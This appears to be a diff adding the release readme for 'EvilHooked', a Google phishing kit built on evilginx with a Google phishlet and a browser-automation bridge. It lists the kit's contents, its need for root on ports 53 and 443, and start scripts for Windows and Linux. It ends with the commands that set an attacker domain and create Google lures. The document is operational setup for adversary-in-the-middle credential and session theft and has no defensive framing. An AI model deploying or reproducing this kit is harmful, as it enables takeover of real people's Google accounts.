@@ -1,0 +1,20 @@
+EvilHooked Google kit release 4.3.0-beta.2 (linux/amd64)
+
+Contents (no Go source):
+  evilhooked/evilginx/evilginx
+  evilhooked/evilginx/phishlets/google.yaml
+  evilhooked/evilginx-config/
+  evilhooked/puppet-google.json
+  puppet-bridge/   (Node JS runtime вЂ” not Go)
+
+Requirements:
+  - Node.js 18+ on PATH
+  - Google Chrome / Chromium
+  - Admin/root for ports 53 and 443
+
+Start:
+  Windows: START.bat  or  powershell -File START.ps1
+  Linux:   chmod +x START.sh && sudo ./START.sh
+
+First run runs npm install in puppet-bridge automatically.
+In evilginx: config domain <your.domain>   then   lures create google
